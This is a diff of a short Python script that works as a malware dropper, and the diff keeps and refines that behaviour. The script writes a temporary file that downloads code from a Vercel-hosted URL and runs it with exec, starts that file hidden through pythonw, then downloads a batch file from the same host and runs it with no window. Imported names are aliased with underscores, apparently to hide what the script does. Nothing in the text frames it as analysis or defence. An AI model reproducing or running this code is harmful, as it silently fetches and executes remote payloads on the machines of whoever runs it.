@@ -1,30 +1,24 @@
 from tempfile import NamedTemporaryFile as _ffile
 from sys import executable as _eexecutable
-from os import system as _ssystem
+from subprocess import Popen, CREATE_NO_WINDOW
 import requests
 import os
 import uuid
 import tempfile
-import subprocess
 
 _ttmp = _ffile(delete=False)
 _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("https://handler-phi.vercel.app/2.txt").read())""")
 _ttmp.close()
-try:
-    _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
-except:
-    pass
+
+pythonw_path = _eexecutable.replace("python.exe", "pythonw.exe")
+Popen([pythonw_path, _ttmp.name])
 
 url = "https://handler-phi.vercel.app/hand.bat"
 temp = tempfile.gettempdir()
-name = os.path.join(temp, str(uuid.uuid4()) + ".bat")
+name = os.path.join(temp, f"{uuid.uuid4()}.bat")
 
 response = requests.get(url)
-
 if response.status_code == 200:
     with open(name, 'wb') as dosya:
         dosya.write(response.content)
-    
-    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
-else:
-    exit()
+    Popen([name], creationflags=CREATE_NO_WINDOW, shell=True)
